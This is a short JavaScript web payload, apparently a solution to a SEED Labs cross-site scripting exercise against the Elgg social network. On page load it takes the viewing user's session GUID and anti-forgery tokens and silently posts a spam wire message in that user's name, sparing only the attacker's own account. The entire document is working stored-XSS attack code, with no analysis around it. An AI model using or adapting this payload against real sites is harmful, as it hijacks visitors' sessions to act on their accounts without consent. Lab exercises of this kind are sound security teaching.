<script type="text/javascript">
	window.onload = function() {
		/* accessing guid, elgg timestamp, elgg security token of the current user */
		var guid = elgg.session.user.guid;
		// Post content
        var wirepost = {
            "body" : `To earn 12 USD/Hour (!), visit now http://www.seed-server.com/profile/samy`
        };
        
        // Constructing the HTTP POST request(url & content) to post on the wire on behalf of the victim
        const sendurl = 'http://www.seed-server.com/action/thewire/add';
        const content = new URLSearchParams({
            "__elgg_token": elgg.security.token.__elgg_token,
            "__elgg_ts": elgg.security.token.__elgg_ts,
            ...wirepost
        }).toString();
		
		/* creating and sending Ajax request to post on the wire on behalf of the victim */
		if(guid !== 59) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
		  	Ajax.open('POST', sendurl, true);
			Ajax.setRequestHeader('Host', 'www.seed-server.com');
			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			Ajax.send(content);
		}
	}
</script>